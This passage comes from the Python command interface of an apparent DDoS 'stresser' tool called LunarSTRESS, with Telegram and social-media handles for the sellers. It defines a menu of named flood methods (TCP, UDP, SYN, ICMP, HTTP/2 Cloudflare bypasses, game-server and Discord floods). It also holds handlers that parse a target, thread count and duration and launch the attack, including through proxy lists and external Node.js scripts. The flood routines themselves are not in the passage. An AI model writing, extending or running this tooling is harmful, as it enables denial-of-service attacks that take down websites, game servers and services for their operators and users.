{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║                      ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l4 tcpflood.. ")}{cyan_to_pink("<ip> <threads> <time> <port>")}        {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║                      ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l4 dns....... ")}{cyan_to_pink("<ip> <threads> <time> <port>")}        {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {cyan_to_pink(" Methods Working:")}    {cyan_to_blue("║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l4 udp-kill.. ")}{cyan_to_pink("<ip> <threads> <time> <port>")}        {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")}  {gold_to_white("  [L7]")} {cyan_to_pink("● online   ")}{cyan_to_blue("  ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l4 icmp-blast ")}{cyan_to_pink("<ip> <threads> <time> <port>")}        {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")}  {gold_to_white("  [L4]")} {cyan_to_pink("● online   ")}{cyan_to_blue("  ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l4 syn-strike ")}{cyan_to_pink("<ip> <threads> <time> <port>")}        {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")}  {gold_to_white("  [L2]")} {cyan_to_pink("● online   ")}{cyan_to_blue("  ║")} {cyan_to_pink("░")} {cyan_to_blue("╠════════════════════════════════════════════════════════╬═══════════════════════╣")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")}  {gold_to_white("  [GM]")} {cyan_to_pink("● online   ")}{cyan_to_blue("  ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[HTTP/2]                                               ")}{cyan_to_blue("‖")} {gold_to_white("                      ")}{cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")}  {gold_to_white("  [MC]")} {cyan_to_pink("● online   ")}{cyan_to_blue("  ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".h2 h2-blast.. ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")}  {gold_to_white("  [DS]")} {cyan_to_pink("● online   ")}{cyan_to_blue("  ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".h2 h2-hold... ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("╠══════════════════════╣")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".h2 h2-godly.. ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║                      ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".h2 h2-bypass. ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {cyan_to_pink(" Telegram Channel:")}  {cyan_to_blue(" ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".h2 starxbypass")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {cyan_to_white(" LunarSTRESS.t.me")}   {cyan_to_blue(" ║")} {cyan_to_pink("░")} {cyan_to_blue("╠════════════════════════════════════════════════════════╬═══════════════════════╣")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("╠══════════════════════╣")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[GAME]                                                 ")}{cyan_to_blue("‖")} {gold_to_white("                      ")}{cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {cyan_to_pink("  Socials: ₊⁺☀︎₊⁺")}    {cyan_to_blue(" ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".game game-crash ")}{cyan_to_pink("<ip> <threads> <duration> <port>")} {cyan_to_blue(" ‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {gold_to_white("  TT: @neonworid")}    {cyan_to_blue(" ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".game lobby-flood")}{cyan_to_pink("<ip> <threads> <duration> <port>")} {cyan_to_blue(" ‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {gold_to_white("  TG: @neonworid")}    {cyan_to_blue(" ║")} {cyan_to_pink("░")} {cyan_to_blue("╠════════════════════════════════════════════════════════╬═══════════════════════╣")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {gold_to_white("  TGC: @cursenet")}    {cyan_to_blue(" ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[MC]                                                   ")}{cyan_to_blue("‖")} {gold_to_white("                      ")}{cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║                      ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".connect.......          ")}{cyan_to_pink("                         ")} {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {gold_to_white("  MOD: @fuckbyba")}    {cyan_to_blue(" ║")} {cyan_to_pink("░")} {cyan_to_blue("╠════════════════════════════════════════════════════════╬═══════════════════════╣")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("╚══════════════════════╝")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[SPECIAL]                                              ")}{cyan_to_blue("‖")} {gold_to_white("                      ")}{cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░░░░░░░░░░░░░░░░░░░░░░░░░░░░")} {cyan_to_blue("‖")}{gold_to_white(" [●]")} {cyan_to_pink(".discord....... ")}{cyan_to_pink("<link> <threads> <duration> <port>")} {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("╠══════════════════════════════╬════════════════════════════════════════════════════════╩═══════════════════════╣")}
{cyan_to_blue("‖")} {cyan_to_pink("░░░░░░░░░░░░░░░░░░░░░░░░░░░░")}{cyan_to_blue(" ‖")}{gold_to_white("[TIPS] We reccomend you to always use 2500 threads it is the most powerful")}{cyan_to_blue("      ‖")}
{cyan_to_blue("╚══════════════════════════════╩════════════════════════════════════════════════════════╩═══════════════════════╝")}
""")

        elif command == "plsletmego":
            exit()
        
        elif command == "menu":
            bannerm2()

        elif command == "connect":
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Launching Minecraft bot flood GUI..."))
            subprocess.run(["python", "minecraft_bot.py"])  # Assuming a separate script for Minecraft bot
            clearcs()
            bannerm2()

        elif command.startswith(".l7"):
            try:
                args = command.split()
                if len(args) < 5:
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .l7 <method> <url> <threads> <duration> [port]"))
                    continue
                method = args[1].lower()
                url = args[2]
                threads = int(args[3])
                duration = int(args[4])
                port = int(args[5]) if len(args) > 5 else None
                proxy_type = 5  # Default to SOCKS5
                # Added 'kill' to the list of valid L7 methods
                if method not in ["cc", "kill", "post", "head", "uambypass", "browser", "home", "cfbypass", "tls", "ovh", "dgb", "http-storm", "api-killer"]:
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid L7 method. Use 'methods' to list available options."))
                    continue
                if threads < 1 or duration < 1:
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads and duration must be positive integers."))
                    continue
                Launch(method, url, threads, duration, proxy_type, port)
            except (ValueError, IndexError):
                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .l7 <method> <url> <threads> <duration> [port]"))

        elif command.startswith(".l4"):
            try:
                args = command.split()
                if len(args) < 5:
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .l4 <method> <ip> <threads> <duration> [port]"))
                    continue
                method = args[1].lower()
                ip = args[2]
                threads = int(args[3])
                duration = int(args[4])
                port = int(args[5]) if len(args) > 5 else None
                proxy_type = 5  # Default to SOCKS5
                if method not in ["udpflood", "tcpflood", "dns", "udp-kill", "icmp-blast", "syn-strike"]:
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid L4 method. Use 'methods' to list available options."))
                    continue
                if threads < 1 or duration < 1:
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads and duration must be positive integers."))
                    continue
                Launch(method, ip, threads, duration, proxy_type, port)
            except (ValueError, IndexError):
                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .l4 <method> <ip> <threads> <duration> [port]"))

        elif command.startswith(".game"):
            try:
                args = command.split()
                if len(args) < 5:
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .game <method> <ip> <threads> <duration> [port]"))
                    continue
                method = args[1].lower()
                ip = args[2]
                threads = int(args[3])
                duration = int(args[4])
                port = int(args[5]) if len(args) > 5 else None
                proxy_type = 5  # Default to SOCKS5
                if method not in ["game-crash", "lobby-flood"]:
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid game method. Use 'methods' to list available options."))
                    continue
                if threads < 1 or duration < 1:
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads and duration must be positive integers."))
                    continue
                Launch(method, ip, threads, duration, proxy_type, port)
            except (ValueError, IndexError):
                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .game <method> <ip> <threads> <duration> [port]"))

        elif command.startswith(".discord"):
            try:
                args = command.split()
                if len(args) < 4:
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .discord <link> <threads> <duration> [port]"))
                    continue
                method = "discord"
                link = args[1]
                threads = int(args[2])
                duration = int(args[3])
                port = int(args[4]) if len(args) > 4 else None
                proxy_type = 5  # Default to SOCKS5
                if threads < 1 or duration < 1:
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads and duration must be positive integers."))
                    continue
                Launch(method, link, threads, duration, proxy_type, port)
            except (ValueError, IndexError):
                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .discord <link> <threads> <duration> [port]"))

        elif command.startswith(".h2"):
            try:
                args = command.split()
                if len(args) != 6:
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .h2 <method> <url> <time> <rate> <threads>"))
                    continue
                method = args[1].lower()
                url = args[2]
                time_duration = int(args[3])
                rate = int(args[4])
                threads = int(args[5])
                proxy_file = "proxies.txt"  # Hardcoded proxy file

                # Validate the method
                valid_h2_methods = ["h2-bypass", "h2-blast", "h2-hold", "h2-godly", "starxbypass"]
                if method not in valid_h2_methods:
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid H2 method. Use 'methods' to list available options."))
                    continue

                if time_duration < 1 or rate < 1 or threads < 1:
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Time, rate, and threads must be positive integers."))
                    continue

                # Map the method to the corresponding JavaScript file
                js_file = method + ".js" if method in ["h2-bypass", "h2-blast", "h2-hold", "h2-godly"] else "StarsXBypass.js"

                # Display attack summary (similar to the Launch function)
                clearcs()
                print(f"""{Colorate.Horizontal(Colors.cyan_to_blue, "             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═")}
{Colorate.Horizontal(Colors.cyan_to_blue, "             ╠═╣ ║  ║ ╠═╣║  ╠╩╗")}
{Colorate.Horizontal(Colors.cyan_to_blue, "             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩")}
{white}  ⋆.˚ ☾ .⭒˚ 𝓑𝓮𝓼𝓽 𝓬𝓱𝓮𝓪𝓹 𝓼𝓽𝓻𝓮𝓼𝓼𝓮𝓻 ⋆.˚ ☾ .⭒˚
{Colorate.Horizontal(Colors.cyan_to_blue, "╔═══════════════════════════════════════════╗")}
{Colorate.Horizontal(Colors.cyan_to_blue, "║")} {white}𝓐𝓽𝓽𝓪𝓬𝓴 𝓢𝓾𝓶𝓶𝓪𝓻𝔂 {Colorate.Horizontal(Colors.cyan_to_blue, "                           ║")}
{Colorate.Horizontal(Colors.cyan_to_blue, "╠═══╦═══════════════════════════════════════╣")}
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴛᴀʀɢᴇᴛ {Colorate.Horizontal(Colors.cyan_to_blue, "    ➤")}  {(url if method in ['cc', 'post', 'head', 'uambypass', 'browser', 'home', 'cfbypass', 'tls', 'ovh', 'dgb', 'http-storm', 'api-killer', 'kill'] else url).ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴍᴇᴛʜᴏᴅ {Colorate.Horizontal(Colors.cyan_to_blue, "    ➤")}  {method.ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴛɪᴍᴇ {Colorate.Horizontal(Colors.cyan_to_blue, "      ➤")}  {str(time_duration).ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴛʜʀᴇᴀᴅ {Colorate.Horizontal(Colors.cyan_to_blue, "    ➤")}  {str(threads).ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "╠═══╬═══════════════════════════════════════╣")}
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴀᴄᴄᴇꜱꜱ     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}  VIP
{Colorate.Horizontal(Colors.cyan_to_blue, "╠═══╬═══════════════════════════════════════╣")}
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴄʜᴇᴄᴋʜᴏꜱᴛ  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}  https://check-host.net/check-http?host={(url if method in ['cc', 'post', 'head', 'uambypass', 'browser', 'home', 'cfbypass', 'tls', 'ovh', 'dgb', 'http-storm', 'api-killer', 'kill'] else url)}
{Colorate.Horizontal(Colors.cyan_to_blue, "╚═══╩═══════════════════════════════════════╝")}""")

                # Run the attack using subprocess
                try:
                    subprocess.run([
                        "node",
                        js_file,
                        url,
                        str(time_duration),
                        str(rate),
                        str(threads),
                        proxy_file
                    ], check=True)
                    print(Colorate.Horizontal(Colors.cyan_to_blue, f"> Attack {method.upper()} finished."))
                except subprocess.CalledProcessError:
                    print(Colorate.Horizontal(Colors.cyan_to_blue, f"> Failed to execute {js_file}. Ensure Node.js is installed and the script exists."))
                except FileNotFoundError:
                    print(Colorate.Horizontal(Colors.cyan_to_blue, f"> {js_file} not found in the current directory."))
            except (ValueError, IndexError):
                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .h2 <method> <url> <time> <rate> <threads>"))

        else:
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Unknown command. Type 'help' for a list of commands."))

if __name__ == "__main__":
    play_ascii_video("log.mp4", duration=3)
    clearcs()
    main()
